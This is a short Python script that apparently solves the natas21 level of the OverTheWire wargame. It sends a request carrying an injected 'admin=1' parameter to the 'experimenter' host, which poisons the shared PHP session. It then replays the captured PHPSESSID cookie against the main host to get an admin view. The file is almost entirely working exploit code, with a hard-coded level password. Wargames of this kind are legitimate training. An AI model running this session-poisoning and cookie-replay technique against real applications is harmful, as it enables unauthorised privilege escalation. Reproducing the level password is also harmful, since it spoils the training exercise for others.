import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas21', '7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU')

url1 = "http://natas21-experimenter.natas.labs.overthewire.org/"
url2 = "http://natas21.natas.labs.overthewire.org/"

s = requests.Session()
s.auth = basicAuth

# Step 1: poison the session
r1 = s.get(url1, params={"submit": "1", "admin": "1"})

# Grab the PHPSESSID value that was actually set
sessid = s.cookies.get("PHPSESSID", domain="natas21-experimenter.natas.labs.overthewire.org")
print("Captured session ID:", sessid)

# Step 2: explicitly attach that same PHPSESSID value to the request for the other host
r2 = requests.get(url2, auth=basicAuth, cookies={"PHPSESSID": sessid})
print(r2.text)